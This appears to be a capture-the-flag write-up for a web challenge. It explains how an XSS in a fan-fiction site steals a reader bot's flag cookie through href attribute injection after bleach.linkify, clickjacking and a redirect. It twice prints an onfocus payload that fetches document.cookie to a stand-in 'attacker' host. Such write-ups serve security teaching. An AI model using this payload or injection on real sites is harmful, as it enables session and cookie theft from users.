@@ -1,0 +1,55 @@
+---
+title: "Dream of You"
+categories: ["web"]
+solves: 26
+---
+# Challenge
+There is a fan fiction submission site where you can submit content at `/submit` and view it at `/read/<id>`. Occurrences of `[name]` in the body are replaced with the reader's name, and URLs are automatically linkified. Sending a post ID to `/report` causes the Reader Bot to view that page, with the `flag` set as a cookie.
+
+The Reader Bot does not set `flag` as `HttpOnly`, so if XSS can be achieved, the cookie can be extracted from `document.cookie`.
+
+# Solution
+Note that the `[name]` replacement happens after linkification. The body is first sanitized, then linkified with `bleach.linkify`, and then `[name]` is embedded by a simple string replacement. The `name` is `bleach.clean`-ed, but it is not attribute-escaped, so including `"` breaks the `href` and allows attribute injection.
+
+```python showLineNumbers
+@app.get("/read/<int:story_id>")
+def read_story(story_id: int):
+    story = next((s for s in STORIES if s["id"] == story_id), None)
+    if story is None:
+        abort(404)
+    name = request.args.get("name") or story["default_name"]
+    name = sanitize_text(name.strip())
+    content = story["content"].replace("[name]", "[name] ")
+    sanitized = sanitize_text(content)
+    linkified = linkify_text(sanitized)
+    rendered = linkified.replace("[name]", name)
+    return render_template(
+        "read.html",
+        title=escape(story["title"]),
+        name=escape(name),
+        story=Markup(rendered),
+    )
+```
+
+If the body contains a string like `https://example.com/?q=[name]`, linkify generates `<a href="https://example.com/?q=[name]">...</a>`. Since `[name]` appears inside `href`, attribute injection becomes possible after the replacement.
+
+By setting a value like
+`"onfocus=fetch('https://attacker/?'+document.cookie) autofocus=`
+as `default_name`, the result becomes `<a href="https://example.com/?q="onfocus=fetch('https://attacker/?'+document.cookie) autofocus=">...</a>`, breaking out of `href` and injecting `onfocus` and `autofocus`. This causes `fetch` to execute automatically on page load, sending the Cookie to the attacker.
+However, `default_name` has a 20-character limit, so the payload cannot be inserted directly.
+
+Also, since a space is inserted after `[name]`, placing `[name]` in the middle of a URL to leverage the subsequent characters for attribute injection is not possible either.
+
+On the other hand, the `name` parameter in `/read/<id>?name=...` has no length limit. So, we first use an injection that fits within the `default_name` length to clickjack when the bot clicks the name input field. For example, setting `"style=padding:9%;` expands the click area of the URL, allowing the bot to be redirected to an arbitrary URL when it clicks on `input[name='name']`.
+
+By setting the redirect destination to `/read/<id>?name=<payload>`, we can make the bot navigate to a page with an arbitrary `name`. Setting `name` to something like
+`"onfocus=fetch('https://attacker/?'+document.cookie) autofocus=`
+breaks out of `href` and injects `onfocus` and `autofocus`, causing `fetch` to execute automatically on page load.
+
+To make the bot access `/read`, the URL must be specified as `http://dream-of-you:5000`, but this is not recognized as a URL by linkify, so a redirect via something like `https://redirectmeto.com/http://dream-of-you:5000` is needed.
+
+This allows us to obtain the Reader Bot's `flag` cookie.
+
+
+
+There were several unintended solutions, such as one using `" 'x='` and another using `[name<img/>]`. This reminded me how difficult it is to patch unintended solutions in web challenges...
